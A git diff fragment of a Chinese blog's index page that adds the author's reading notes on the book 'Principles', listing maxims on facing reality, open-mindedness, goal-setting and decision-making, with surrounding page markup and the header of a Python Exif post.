+<p>读原则的个人感悟，小mark一下。</p>
+<h3 id="我想要什么？事实是什么？如何行动？"><a href="#我想要什么？事实是什么？如何行动？" class="headerlink" title="我想要什么？事实是什么？如何行动？"></a>我想要什么？事实是什么？如何行动？</h3><p>与失败比起来，我对乏味和平庸的恐惧要严重得多，对我而已，很好的事要比糟糕的事好，而糟糕的事要比平庸的事好，因为糟糕的事至少给生活增加了滋味。</p>
+<p><img src="/2018/11/26/原则/yz2.jpg" alt="yz2"></p>
+<p>当我开始从理解现实规律的视角看待现实，而不是认为现实不对时，我发现几乎所有起初看起来“不好”的东西，如雨天，缺点甚至是死亡，都是由于我对于自己相要拥有的东西持有先入为主之见。我逐渐意识到，我产生这些最初的反应，是因为我没有把事物放到大背景下看待，即现实的构造是让整体实现最优，而不是尽力实现我的愿望。</p>
+<p><strong>没有痛苦就没有收获，痛苦+反思=进步</strong></p>
+<p>人总是难以识别并承认自身的错误和弱点，有时这是因为没有自知之明，但更常见的原因是。自尊心起了阻碍作用。</p>
+<h3 id="如何做到头脑极度开放："><a href="#如何做到头脑极度开放：" class="headerlink" title="如何做到头脑极度开放："></a>如何做到头脑极度开放：</h3><p>1.诚恳地相信你也许并不知道最好的解决办法是什么，并认识到，与你知道的东西相比，能不能妥善处理“不知道”才是更重要的。</p>
+<p>2.认识到决策应当分成两步：先分析所有相关信息，然后决定。</p>
+<p>3.不要担心自己的形象，只关心如何实现目标。</p>
+<p>4.认识到你不能“只产出不吸纳”</p>
+<p>5.认识到为了能够从他人的角度看待事物，你必须暂时悬置判断，只有设身处地，你才能合理评估另一种观点的价值。</p>
+<p>6.谨记，你是在寻找最好的答案，而不是你自己能得出的最好答案。</p>
+<p>7.搞清楚你是在争论还是在试图理解一个问题，并根据你和对方的可信度，想想哪种做法最合理。</p>
+<h3 id="生活原则？"><a href="#生活原则？" class="headerlink" title="生活原则？"></a>生活原则？</h3><p> 独立思考并决定：</p>
+<p>（1）你想要什么；</p>
+<p>（2）事实是什么；</p>
+<p>（3）面对事实</p>
+<p>如何实现自己的愿望，而且要保持谦逊和心胸开阔，以便你能动用自己的最佳思维。</p>
+<p>生活原则导言</p>
+<p>● 考察影响你的那些事物的规律，从而理解其背后的因果关系，并学习有效应对这些事物的原则。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.拥抱现实，应对现实</span><br><span class="line">2.用五步流程实现人生愿望</span><br><span class="line">3.做到头脑极度开放</span><br><span class="line">4.理解人与人大不相同</span><br><span class="line">5.学习如何有效决策</span><br></pre></td></tr></table></figure>
+<h4 id="1-拥抱现实，应对现实"><a href="#1-拥抱现实，应对现实" class="headerlink" title="1. 拥抱现实，应对现实"></a>1. 拥抱现实，应对现实</h4><h5 id="1-1-做一个超级现实的人"><a href="#1-1-做一个超级现实的人" class="headerlink" title="1.1 做一个超级现实的人"></a>1.1 做一个超级现实的人</h5><p>a. 梦想+现实+决心=成功的生活。</p>
+<h5 id="1-2-真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据"><a href="#1-2-真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据" class="headerlink" title="1.2 真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据"></a>1.2 真相（或者更精确地说，对现实的准确理解）是任何良好结果的根本依据</h5><h5 id="1-3-做到头脑极度开放、极度透明"><a href="#1-3-做到头脑极度开放、极度透明" class="headerlink" title="1.3 做到头脑极度开放、极度透明"></a>1.3 做到头脑极度开放、极度透明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 对于快速学习和有效改变而言，头脑极度开放、极度透明是价值无限的。</span><br><span class="line"></span><br><span class="line">b.不要担心其他人的看法，使之成为你的障碍。</span><br><span class="line"></span><br><span class="line">c. 拥抱极度求真和极度透明将带来更有意义的工作和更有意义的人际关系。</span><br></pre></td></tr></table></figure>
+<h5 id="1-4-观察自然，学习现实规律"><a href="#1-4-观察自然，学习现实规律" class="headerlink" title="1.4 观察自然，学习现实规律"></a>1.4 观察自然，学习现实规律</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a. 不要固守你对事物“应该”是什么样的看法，这将使你无法了解真实的情况。</span><br><span class="line"></span><br><span class="line">b. 一个东西要“好”，就必须符合现实的规律，并促进整体的进化，这能带来最大的回报。</span><br><span class="line"></span><br><span class="line">c. 进化是宇宙中最强大的力量，是唯一永恒的东西，是一切的驱动力。</span><br><span class="line"></span><br><span class="line">d. 不进化就死亡。</span><br></pre></td></tr></table></figure>
+<h5 id="1-5-进化是生命最大的成就和最大的回报"><a href="#1-5-进化是生命最大的成就和最大的回报" class="headerlink" title="1.5 进化是生命最大的成就和最大的回报"></a>1.5 进化是生命最大的成就和最大的回报</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. 个体的激励机制必须符合群体的目标。</span><br><span class="line"></span><br><span class="line">b. 现实为了整体而趋向最优化，而不是为了个体。</span><br><span class="line"></span><br><span class="line">c. 通过快速试错以适应现实是无价的。</span><br><span class="line"></span><br><span class="line">d. 意识到你既是一切又什么都不是，并决定你想成为什么样子。</span><br><span class="line"></span><br><span class="line">e. 你的未来取决于你的视角。</span><br></pre></td></tr></table></figure>
+<h5 id="1-6-理解自然提供的现实教训"><a href="#1-6-理解自然提供的现实教训" class="headerlink" title="1.6 理解自然提供的现实教训"></a>1.6 理解自然提供的现实教训</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 把你的进化最大化。</span><br><span class="line"></span><br><span class="line">b. 记住“没有痛苦就没有收获”。</span><br><span class="line"></span><br><span class="line">c. 自然的一项根本法则是，为了赢得力量，人必须努力突破极限，而这是痛苦的。</span><br></pre></td></tr></table></figure>
+<h5 id="1-7-痛苦-反思-进步"><a href="#1-7-痛苦-反思-进步" class="headerlink" title="1.7 痛苦+反思=进步"></a>1.7 痛苦+反思=进步</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 迎接而非躲避痛苦。</span><br><span class="line"></span><br><span class="line">b. 接受严厉的爱。</span><br></pre></td></tr></table></figure>
+<h5 id="1-8-考虑后续与再后续的结果"><a href="#1-8-考虑后续与再后续的结果" class="headerlink" title="1.8 考虑后续与再后续的结果"></a>1.8 考虑后续与再后续的结果</h5><h5 id="1-9-接受结果"><a href="#1-9-接受结果" class="headerlink" title="1.9 接受结果"></a>1.9 接受结果</h5><h5 id="1-10-从更高的层次俯视机器"><a href="#1-10-从更高的层次俯视机器" class="headerlink" title="1.10 从更高的层次俯视机器"></a>1.10 从更高的层次俯视机器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 把自己想象成一部在大机器里运转的小机器，并明白你有能力改变你的机器以实现更好的结果。</span><br><span class="line"></span><br><span class="line">b. 通过比较你实现的结果和你的目标，你就能确定如何改进你的机器。</span><br><span class="line"></span><br><span class="line">c. 区别作为机器设计者的你和作为机器中工作者的你。</span><br><span class="line"></span><br><span class="line">d. 大多数人犯下的最大错误是不客观看待自己以及其他人，这导致他们一次次地栽在自己或其他人的弱点上。</span><br><span class="line"></span><br><span class="line">e. 成功的人能超越自身，客观看待事物，并管理事物以塑造改变。</span><br><span class="line"></span><br><span class="line">f. 在你不擅长的领域请教擅长的其他人，这是一个你无论如何都应该培养的出色技能，这将帮助你建立起安全护栏，避免自己做错事。</span><br><span class="line"></span><br><span class="line">g. 因为客观看待自身很困难，所以你需要依赖其他人的意见，以及全部证据。</span><br><span class="line"></span><br><span class="line">h. 如果你的头脑足够开放，足够有决心，你几乎可以实现任何愿望。</span><br></pre></td></tr></table></figure>
+<h4 id="2-用五步流程实现你的人生愿望"><a href="#2-用五步流程实现你的人生愿望" class="headerlink" title="2.用五步流程实现你的人生愿望"></a>2.用五步流程实现你的人生愿望</h4><h5 id="2-1-有明确的目标"><a href="#2-1-有明确的目标" class="headerlink" title="2.1 有明确的目标"></a>2.1 有明确的目标</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 排列优先顺序：尽管你几乎可以得到你想要的任何东西，但你不可能得到你想要的所有东西。</span><br><span class="line"></span><br><span class="line">b. 不要混淆目标和欲望。</span><br><span class="line"></span><br><span class="line">c. 调和你的目标和欲望，以明确你在生活中真正想要的东西。</span><br><span class="line"></span><br><span class="line">d. 不要把成功的装饰误认为成功本身。</span><br><span class="line"></span><br><span class="line">e. 永远不要因为你觉得某个目标无法实现就否决它。</span><br><span class="line"></span><br><span class="line">f. 谨记伟大的期望创造伟大的能力。</span><br><span class="line"></span><br><span class="line">g. 如果你拥有灵活性并自我归责，那么几乎没有什么能阻止你成功。</span><br><span class="line"></span><br><span class="line">h. 知道如何对待挫折和知道如何前进一样重要。</span><br></pre></td></tr></table></figure>
+<h5 id="2-2-找出问题，并且不容忍问题"><a href="#2-2-找出问题，并且不容忍问题" class="headerlink" title="2.2 找出问题，并且不容忍问题"></a>2.2 找出问题，并且不容忍问题</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a. 把令人痛苦的问题视为考验你的潜在进步机会。</span><br><span class="line"></span><br><span class="line">b. 不要逃避问题，因为问题根植于看起来并不美好的残酷现实。</span><br><span class="line"></span><br><span class="line">c. 要精准地找到问题所在。</span><br><span class="line"></span><br><span class="line">d. 不要把问题的某个原因误认为问题本身。</span><br><span class="line"></span><br><span class="line">e. 区分大问题和小问题。</span><br><span class="line"></span><br><span class="line">f. 找出一个问题之后，不要容忍问题。</span><br></pre></td></tr></table></figure>
+<h5 id="2-3-诊断问题，找到问题的根源"><a href="#2-3-诊断问题，找到问题的根源" class="headerlink" title="2.3 诊断问题，找到问题的根源"></a>2.3 诊断问题，找到问题的根源</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 先把问题是什么弄明白，再决定怎么做。</span><br><span class="line"></span><br><span class="line">b. 区分直接原因和根本原因。</span><br><span class="line"></span><br><span class="line">c. 认识到了解人（包括你自己）的特性，有助于对其形成合理预期。</span><br></pre></td></tr></table></figure>
+<h5 id="2-4-规划方案"><a href="#2-4-规划方案" class="headerlink" title="2.4 规划方案"></a>2.4 规划方案</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a. 前进之前先回顾。</span><br><span class="line"></span><br><span class="line">b. 把你的问题看作一部机器产生的一系列结果。</span><br><span class="line"></span><br><span class="line">c. 谨记实现你的目标通常有很多途径。</span><br><span class="line"></span><br><span class="line">d. 把你的方案设想为一个电影剧本，然后循序渐进地思考由谁来做什么事。</span><br><span class="line"></span><br><span class="line">e. 把你的方案写下来，让所有人都能看到，并对照方案执行。</span><br><span class="line"></span><br><span class="line">f. 要明白，规划一个好方案不一定需要很多时间。</span><br></pre></td></tr></table></figure>
+<h5 id="2-5-坚定地从头至尾执行方案"><a href="#2-5-坚定地从头至尾执行方案" class="headerlink" title="2.5 坚定地从头至尾执行方案"></a>2.5 坚定地从头至尾执行方案</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 规划做得再好，不执行也无济于事。</span><br><span class="line"></span><br><span class="line">b. 良好工作习惯的重要性常被大大低估。</span><br><span class="line"></span><br><span class="line">c. 建立清晰的衡量标准来确保你在严格执行方案。</span><br></pre></td></tr></table></figure>
+<h5 id="2-6-谨记：如果你找到了解决方案，弱点是不重要的"><a href="#2-6-谨记：如果你找到了解决方案，弱点是不重要的" class="headerlink" title="2.6 谨记：如果你找到了解决方案，弱点是不重要的"></a>2.6 谨记：如果你找到了解决方案，弱点是不重要的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 考察你犯错误的类型，并识别你通常在五步流程中的哪一步上做得不好。</span><br><span class="line"></span><br><span class="line">b. 每个人都至少有一个最大的弱点阻碍其成功，找到你的这个弱点并处理它。</span><br></pre></td></tr></table></figure>
+<h5 id="2-7-理解你和其他人的“意境地图”与谦逊性"><a href="#2-7-理解你和其他人的“意境地图”与谦逊性" class="headerlink" title="2.7 理解你和其他人的“意境地图”与谦逊性"></a>2.7 理解你和其他人的“意境地图”与谦逊性</h5><h4 id="3-做到头脑极度开放"><a href="#3-做到头脑极度开放" class="headerlink" title="3.做到头脑极度开放"></a>3.做到头脑极度开放</h4><h5 id="3-1-认识你的两大障碍"><a href="#3-1-认识你的两大障碍" class="headerlink" title="3.1 认识你的两大障碍"></a>3.1 认识你的两大障碍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 理解你的自我意识障碍。</span><br><span class="line"></span><br><span class="line">b. “两个你”在争夺对你的控制权。</span><br><span class="line"></span><br><span class="line">c. 理解你的思维盲点障碍。</span><br></pre></td></tr></table></figure>
+<h5 id="3-2-奉行头脑极度开放"><a href="#3-2-奉行头脑极度开放" class="headerlink" title="3.2 奉行头脑极度开放"></a>3.2 奉行头脑极度开放</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a. 诚恳地相信你也许并不知道最好的解决办法是什么，并认识到，与你知道的东西相比，能不能妥善处理“不知道”才是更重要的。</span><br><span class="line"></span><br><span class="line">b. 认识到决策应当分成两步：先分析所有相关信息，然后决定。</span><br><span class="line"></span><br><span class="line">c. 不要担心自己的形象，只关心如何实现目标。</span><br><span class="line"></span><br><span class="line">d. 认识到你不能“只产出不吸纳”。</span><br><span class="line"></span><br><span class="line">e. 认识到为了能够从他人的角度看待事物，你必须暂时悬置判断，只有设身处地，你才能合理评估另一种观点的价值。</span><br><span class="line"></span><br><span class="line">f. 谨记，你是在寻找最好的答案，而不是你自己能得出的最好答案。</span><br><span class="line"></span><br><span class="line">g. 搞清楚你是在争论还是在试图理解一个问题，并根据你和对方的可信度，想想哪种做法最合理。</span><br></pre></td></tr></table></figure>
+<h5 id="3-3-领会并感激：深思熟虑的意见分歧"><a href="#3-3-领会并感激：深思熟虑的意见分歧" class="headerlink" title="3.3 领会并感激：深思熟虑的意见分歧"></a>3.3 领会并感激：深思熟虑的意见分歧</h5><h5 id="3-4-和可信的、愿意表达分歧的人一起审视你的观点"><a href="#3-4-和可信的、愿意表达分歧的人一起审视你的观点" class="headerlink" title="3.4 和可信的、愿意表达分歧的人一起审视你的观点"></a>3.4 和可信的、愿意表达分歧的人一起审视你的观点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 为最坏的情况做准备，以尽量使其不那么糟糕。</span><br></pre></td></tr></table></figure>
+<h5 id="3-5-识别你应当注意的头脑封闭和头脑开放的不同迹象"><a href="#3-5-识别你应当注意的头脑封闭和头脑开放的不同迹象" class="headerlink" title="3.5 识别你应当注意的头脑封闭和头脑开放的不同迹象"></a>3.5 识别你应当注意的头脑封闭和头脑开放的不同迹象</h5><h5 id="3-6-理解你如何做到头脑极度开放"><a href="#3-6-理解你如何做到头脑极度开放" class="headerlink" title="3.6 理解你如何做到头脑极度开放"></a>3.6 理解你如何做到头脑极度开放</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a. 经常利用痛苦来引导自己进行高质量的思考。</span><br><span class="line"></span><br><span class="line">b. 将头脑开放作为一种习惯。</span><br><span class="line"></span><br><span class="line">c. 认识自己的思维盲点。</span><br><span class="line"></span><br><span class="line">d. 假如很多可信的人都说你正在做错事，只有你不这么看，你就要想想自己是不是看偏了。</span><br><span class="line"></span><br><span class="line">e. 冥想。</span><br><span class="line"></span><br><span class="line">f. 重视证据，并鼓励其他人也这么做。</span><br><span class="line"></span><br><span class="line">g. 尽力帮助其他人也保持头脑开放。</span><br><span class="line"></span><br><span class="line">h. 使用以证据为基础的决策工具。</span><br><span class="line"></span><br><span class="line">i. 知道什么时候应当停止为自己的观点辩护，信任自己的决策程序。</span><br></pre></td></tr></table></figure>
+<h4 id="4-理解人与人大不相同"><a href="#4-理解人与人大不相同" class="headerlink" title="4.理解人与人大不相同"></a>4.理解人与人大不相同</h4><h5 id="4-1-明白你与其他人的思维方式能带来的力量"><a href="#4-1-明白你与其他人的思维方式能带来的力量" class="headerlink" title="4.1 明白你与其他人的思维方式能带来的力量"></a>4.1 明白你与其他人的思维方式能带来的力量</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 我们拥有各种天生特征，既可能帮助自己也可能伤害自己，取决于如何应用。</span><br></pre></td></tr></table></figure>
+<h5 id="4-2-有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求"><a href="#4-2-有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求" class="headerlink" title="4 .2 有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求"></a>4 .2 有意义的工作和有意义的人际关系不仅是我们做出的美好选择，而且是我们天生的生理需求</h5><h5 id="4-3-理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望"><a href="#4-3-理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望" class="headerlink" title="4 .3 理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望"></a>4 .3 理解大脑里的主要斗争，以及如何控制这些斗争，以实现“你”的愿望</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a. 要明白，意识与潜意识在不断斗争。</span><br><span class="line"></span><br><span class="line">b. 要知道最常发生的斗争是情绪和思考的斗争。</span><br><span class="line"></span><br><span class="line">c. 调和你的情绪和思考。</span><br><span class="line"></span><br><span class="line">d. 善择你的习惯。</span><br><span class="line"></span><br><span class="line">e. 坚持友善地训练“较低层次的你”，以养成好的习惯。</span><br><span class="line"></span><br><span class="line">f. 理解右脑思维和左脑思维的差别。</span><br><span class="line"></span><br><span class="line">g. 理解大脑可以改变的程度。</span><br></pre></td></tr></table></figure>
+<h5 id="4-4-认识自己和他人的特性"><a href="#4-4-认识自己和他人的特性" class="headerlink" title="4.4 认识自己和他人的特性"></a>4.4 认识自己和他人的特性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a. 内向与外向。</span><br><span class="line"></span><br><span class="line">b. 直觉与感知。</span><br><span class="line"></span><br><span class="line">c. 思考与感觉。</span><br><span class="line"></span><br><span class="line">d. 计划与发觉。</span><br><span class="line"></span><br><span class="line">e. 创造者、推进者、改进者、贯彻者与变通者。</span><br><span class="line"></span><br><span class="line">f. 关注任务与关注目标。</span><br><span class="line"></span><br><span class="line">g. 职场人格量表。</span><br><span class="line"></span><br><span class="line">h. 塑造者是能从构想一路走到构想实现的人。</span><br></pre></td></tr></table></figure>
+<p>#####4.5 无论你要实现什么目标，让合适的人各司其职以支持你的目标，是成功的关键</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a. 管理你自己，并协调其他人实现你的目标。</span><br></pre></td></tr></table></figure>
+<h4 id="5-学习如何有效决策"><a href="#5-学习如何有效决策" class="headerlink" title="5.学习如何有效决策"></a>5.学习如何有效决策</h4><h5 id="5-1-要认识到："><a href="#5-1-要认识到：" class="headerlink" title="5.1 要认识到："></a>5.1 要认识到：</h5><p>（1）影响好决策的最大威胁是有害的情绪；</p>
+<p>（2）决策是一个两步流程（先了解后决定）</p>
+<h5 id="5-2-综合分析眼前的形势"><a href="#5-2-综合分析眼前的形势" class="headerlink" title="5.2 综合分析眼前的形势"></a>5.2 综合分析眼前的形势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. 你能做的最重要的决定之一是决定问谁。</span><br><span class="line"></span><br><span class="line">b. 不要听到什么信什么。</span><br><span class="line"></span><br><span class="line">c. 所有东西都是放在眼前看更大。</span><br><span class="line"></span><br><span class="line">d. 不要夸大新东西的好处。</span><br><span class="line"></span><br><span class="line">e. 不要过度分析细节。</span><br></pre></td></tr></table></figure>
+<h5 id="5-3-综合分析变化中的形势"><a href="#5-3-综合分析变化中的形势" class="headerlink" title="5.3 综合分析变化中的形势"></a>5.3 综合分析变化中的形势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a. 始终记住改善事物的速度和水平，以及两者的关系。</span><br><span class="line"></span><br><span class="line">b. 不必过于精确。</span><br><span class="line"></span><br><span class="line">c. 谨记“80/20法则”，并明白关键性的“20%”是什么。</span><br><span class="line"></span><br><span class="line">d. 不要做完美主义者。</span><br></pre></td></tr></table></figure>
+<h5 id="5-4-高效地综合考虑各个层次"><a href="#5-4-高效地综合考虑各个层次" class="headerlink" title="5.4 高效地综合考虑各个层次"></a>5.4 高效地综合考虑各个层次</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 用“基线以上”和“基线以下”来确定谈话位于哪一层。</span><br><span class="line"></span><br><span class="line">b. 谨记，决策需要在合理的层次做出，但也应在各层次之间保持一致。</span><br></pre></td></tr></table></figure>
+<h5 id="5-5-综合分析现实、理解如何行动的最好工具是逻辑、理性和常识"><a href="#5-5-综合分析现实、理解如何行动的最好工具是逻辑、理性和常识" class="headerlink" title="5.5 综合分析现实、理解如何行动的最好工具是逻辑、理性和常识"></a>5.5 综合分析现实、理解如何行动的最好工具是逻辑、理性和常识</h5><h5 id="5-6-根据预期价值计算做决策"><a href="#5-6-根据预期价值计算做决策" class="headerlink" title="5.6 根据预期价值计算做决策"></a>5.6 根据预期价值计算做决策</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 不管你押对的概率已经有多大，提高你的押对概率始终有价值。</span><br><span class="line"></span><br><span class="line">b. 知道什么时候不要去押注，和知道什么注值得押同样重要。</span><br><span class="line"></span><br><span class="line">c. 最好的选择是好处多于坏处的选择，不是毫无坏处的选择。</span><br></pre></td></tr></table></figure>
+<h5 id="5-7-比较更多信息带来的价值和不做决定造成的成本，决定优先顺序"><a href="#5-7-比较更多信息带来的价值和不做决定造成的成本，决定优先顺序" class="headerlink" title="5.7 比较更多信息带来的价值和不做决定造成的成本，决定优先顺序"></a>5.7 比较更多信息带来的价值和不做决定造成的成本，决定优先顺序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a. 先把你的“必做之事”做完，再做你的“想做之事”。</span><br><span class="line"></span><br><span class="line">b. 你很可能没有时间处理不重要的事，那最好将它留着，以免自己没有时间处理重要的事。</span><br><span class="line"></span><br><span class="line">c. 不要把概率当作可能性。</span><br></pre></td></tr></table></figure>
+<h5 id="5-8-简化"><a href="#5-8-简化" class="headerlink" title="5.8 简化"></a>5.8 简化</h5><h5 id="5-9-使用原则"><a href="#5-9-使用原则" class="headerlink" title="5.9 使用原则"></a>5.9 使用原则</h5><h5 id="5-10-对你的决策进行可信度加权"><a href="#5-10-对你的决策进行可信度加权" class="headerlink" title="5.10 对你的决策进行可信度加权"></a>5.10 对你的决策进行可信度加权</h5><h5 id="5-11-把你的原则转换成算法，让计算机和你一起决策"><a href="#5-11-把你的原则转换成算法，让计算机和你一起决策" class="headerlink" title="5.11 把你的原则转换成算法，让计算机和你一起决策"></a>5.11 把你的原则转换成算法，让计算机和你一起决策</h5><h5 id="5-12-在深刻理解人工智能之前不要过度信赖它"><a href="#5-12-在深刻理解人工智能之前不要过度信赖它" class="headerlink" title="5.12 在深刻理解人工智能之前不要过度信赖它"></a>5.12 在深刻理解人工智能之前不要过度信赖它</h5>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">others</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/26/原则/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-TurboMail存储型XSS漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1056,485 +1463,9 @@
 
 
   
-    <article id="post-python解析Exif元数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/15/python解析Exif元数据/">python解析Exif元数据</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/15/python解析Exif元数据/" class="archive-article-date">
-  	<time datetime="2018-10-15T07:14:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
